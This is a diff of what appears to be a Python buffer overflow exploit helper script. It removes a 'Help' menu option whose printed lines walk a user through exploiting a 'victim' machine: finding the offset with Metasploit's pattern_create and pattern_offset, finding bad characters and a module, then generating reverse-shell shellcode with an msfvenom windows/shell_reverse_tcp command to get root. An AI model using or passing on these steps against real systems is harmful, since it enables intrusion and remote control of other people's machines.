@@ -38,7 +38,6 @@ print("3. EIP")
 print("4. BAD CHARS")
 print("5. FIND RIGHT MODULE")
 print("6. ROOT")
-print("7. Help")
 print("-" * 50)
 ip=input('Enter IP:')
 port=input("Enter port: ")
@@ -283,17 +282,7 @@ except:
 	
 	
 
-if options == 7 : 
 
-	print("In all the lines of code called s.connect(('IP', Port)) plz enter the victims IP and port")	
-	print("For offset go to this directory /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l (Enter number)")	
-	print("affter you get the results copy and paste the gibberish in the code, offset='Enter it here' after that type this command with")
-	print("the same directory type this command ./pattern_offset.rb -l (any number) -q (the number result of the offset), the you have to")
-	print("find the bad chars, to do this google bad chars and find the correct list and paste it in this code line badchars=('place here')")
-	print("with the results of the bad chars you have to find the right module and finaly to get root type a command in msfvenom")
-	print("(this is an example: msfvenom -p windows/shell_reverse_tcp LHOST=(IP)LPORT=(port)AppendExit=true -f c -a x86 -b 'x00'")
-	print("then copy and paste the shellcode given in this line buf=('') and run the code")
-	print("and in this part of the code shellcode = 'A' * 515 + where it says xf3 x12 and the others, that changes depending on the modules")
   	
   	
   	
